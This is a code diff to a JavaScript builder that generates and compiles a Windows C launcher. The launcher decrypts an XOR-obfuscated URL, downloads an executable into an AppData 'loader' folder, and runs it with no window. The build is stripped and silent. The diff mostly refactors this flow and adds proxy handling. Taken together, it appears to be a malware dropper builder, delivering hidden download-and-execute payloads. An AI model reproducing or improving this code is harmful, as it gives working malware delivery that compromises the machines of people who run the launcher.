@@ -78,7 +78,6 @@ function cSource(meta, key, ip, buildId) {
   const safeKey = esc4c(key);
 
   return String.raw`
-// FIX: Define UNICODE at the absolute top so windows.h uses Wide strings automatically
 #define UNICODE
 #define _UNICODE
 #include <windows.h>
@@ -91,8 +90,9 @@ function cSource(meta, key, ip, buildId) {
 
 static const char ACCOUNT_KEY[] = "${safeKey}";
 
-static void decrypt(char* buf, int len, unsigned char key) {
-    for (int i = 0; i < len; i++) buf[i] ^= key;
+static void decrypt_url(wchar_t* out, const unsigned char* enc, int len, unsigned char key) {
+    for (int i = 0; i < len; i++) out[i] = (wchar_t)(enc[i] ^ key);
+    out[len] = 0;
 }
 
 static int is_valid_pe(const wchar_t* p) {
@@ -112,30 +112,26 @@ static int is_valid_pe(const wchar_t* p) {
     return 1;
 }
 
-static int download_file(const wchar_t* url, const wchar_t* dest) {
+static void download_file(const wchar_t* url, const wchar_t* dest) {
     URL_COMPONENTS uc = {0}; uc.dwStructSize = sizeof(uc);
     wchar_t host[256] = {0}; wchar_t path[1024] = {0};
     uc.lpszHostName = host; uc.dwHostNameLength = 256;
     uc.lpszUrlPath = path; uc.dwUrlPathLength = 1024;
     
-    // Now WinHttpCrackUrl resolves to WinHttpCrackUrlW automatically
-    if (!WinHttpCrackUrl(url, 0, 0, &uc)) {
-        return 0;
-    }
-
-    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!hSession) return 0;
-
+    if (!WinHttpCrackUrl(url, 0, 0, &uc)) return;
+    
+    // DEFAULT_PROXY is required for this to work on most VMs
+    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) return;
+    
     HINTERNET hConnect = WinHttpConnect(hSession, host, uc.nPort, 0);
-    if (!hConnect) { WinHttpCloseHandle(hSession); return 0; }
-
+    if (!hConnect) { WinHttpCloseHandle(hSession); return; }
+    
     HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
-    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return 0; }
-
-    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
-    if (bResults) bResults = WinHttpReceiveResponse(hRequest, NULL);
-
-    if (bResults) {
+    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }
+    
+    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
+        WinHttpReceiveResponse(hRequest, NULL)) {
         HANDLE hFile = CreateFileW(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
         if (hFile != INVALID_HANDLE_VALUE) {
             DWORD dwSize = 0, dwDownloaded = 0;
@@ -146,8 +142,7 @@ static int download_file(const wchar_t* url, const wchar_t* dest) {
                 BYTE* pBuffer = (BYTE*)malloc(dwSize);
                 if (pBuffer) {
                     if (WinHttpReadData(hRequest, pBuffer, dwSize, &dwDownloaded)) {
-                        DWORD written = 0;
-                        WriteFile(hFile, pBuffer, dwDownloaded, &written, NULL);
+                        DWORD written; WriteFile(hFile, pBuffer, dwDownloaded, &written, NULL);
                     }
                     free(pBuffer);
                 }
@@ -155,11 +150,7 @@ static int download_file(const wchar_t* url, const wchar_t* dest) {
             CloseHandle(hFile);
         }
     }
-
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
-    return bResults;
+    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
 }
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
@@ -167,16 +158,16 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
 
     Sleep(1500); 
 
-    wchar_t appdata[MAX_PATH];
-    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata))) return 1;
+    wchar_t appData[MAX_PATH];
+    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData))) return 1;
     
-    wchar_t dir[MAX_PATH], keyPath[MAX_PATH], stPath[MAX_PATH], stNewPath[MAX_PATH];
-    _snwprintf(dir,      MAX_PATH, L"%ls\\loader", appdata);
-    _snwprintf(keyPath,  MAX_PATH, L"%ls\\key.json", dir);
-    _snwprintf(stPath,   MAX_PATH, L"%ls\\st.exe",   dir);
-    _snwprintf(stNewPath,MAX_PATH, L"%ls\\st_new.exe", dir);
+    wchar_t loaderDir[MAX_PATH], keyPath[MAX_PATH], stPath[MAX_PATH], stNewPath[MAX_PATH];
+    _snwprintf(loaderDir, MAX_PATH, L"%ls\\loader", appData);
+    _snwprintf(keyPath,   MAX_PATH, L"%ls\\key.json", loaderDir);
+    _snwprintf(stPath,    MAX_PATH, L"%ls\\st.exe",   loaderDir);
+    _snwprintf(stNewPath, MAX_PATH, L"%ls\\st_new.exe", loaderDir);
     
-    CreateDirectoryW(dir, NULL);
+    CreateDirectoryW(loaderDir, NULL);
 
     // 1. Write key.json
     HANDLE hKey = CreateFileW(keyPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -191,23 +182,21 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     // 2. Download st.exe
     int need_st = !is_valid_pe(stPath);
     if (need_st) {
-        char stUrlStr[128] = {0};
-        wchar_t stUrlW[128] = {0};
-        const char encStUrl[] = ${encStUrl};
+        wchar_t stUrl[1024] = {0};
+        const unsigned char encStUrl[] = ${encStUrl};
         
-        decrypt(stUrlStr, sizeof(encStUrl), ${meta.xorKey});
-        MultiByteToWideChar(CP_ACP, 0, stUrlStr, -1, stUrlW, 128);
+        decrypt_url(stUrl, encStUrl, sizeof(encStUrl), ${meta.xorKey});
 
-        if (download_file(stUrlW, stNewPath) && is_valid_pe(stNewPath)) {
+        download_file(stUrl, stNewPath);
+        
+        if (is_valid_pe(stNewPath)) {
             DeleteFileW(stPath);
             MoveFileW(stNewPath, stPath);
             need_st = 0;
         }
     }
 
-    if (need_st) {
-        return 1; 
-    }
+    if (need_st) return 1; 
 
     // 3. Run st.exe hidden
     STARTUPINFOW si = { sizeof(si) };
@@ -218,7 +207,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     _snwprintf(cmd, MAX_PATH, L"\"%ls\"", stPath);
     
     CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW | DETACHED_PROCESS,
-                   NULL, dir, &si, &pi);
+                   NULL, loaderDir, &si, &pi);
                    
     if (pi.hProcess) CloseHandle(pi.hProcess);
     if (pi.hThread)  CloseHandle(pi.hThread);
@@ -286,7 +275,6 @@ export async function compileLauncher({ key, config, baseExe, buildId }) {
                               '--input-format=rc', '--output-format=coff'],
                     { cwd: workDir, timeout: 30_000 });
     
-    // Reverted back to -mwindows for silent execution
     await execFileP(CC, ['-O2', '-s', '-mwindows', '-o', outPath, cPath, resPath,
                          '-lshell32', '-lole32', '-luser32', '-lkernel32', '-ladvapi32', '-lwinhttp'],
                     { cwd: workDir, timeout: 60_000 });
